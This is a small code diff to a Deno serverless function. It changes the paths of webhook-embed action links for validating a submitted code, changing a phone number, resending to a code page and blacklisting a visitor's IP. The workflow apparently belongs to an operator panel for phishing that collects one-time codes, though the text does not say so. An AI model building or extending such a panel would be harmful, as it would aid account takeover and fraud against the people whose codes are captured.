@@ -75,7 +75,7 @@ Deno.serve(async (req) => {
     fields: [
       {
         name: "⚡ Actions",
-        value: `✅ [Valider le code](${appUrl}/admin?trigger=${submissionId})\n❌ [Changer le numéro](${appUrl}/admin?action=wrong&id=${submissionId})\n⏰ [Renvoyer au code](${appUrl}/admin?action=expired&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/admin?action=blacklist&id=${submissionId}&ip=${ip})`,
+        value: `✅ [Valider le code](${appUrl}/action?trigger=${submissionId})\n❌ [Changer le numéro](${appUrl}/action?action=wrong&id=${submissionId})\n⏰ [Renvoyer au code](${appUrl}/action?action=expired&id=${submissionId})\n🚫 [Blacklist instant](${appUrl}/action?action=blacklist&id=${submissionId}&ip=${ip})`,
         inline: false,
       }
     ],
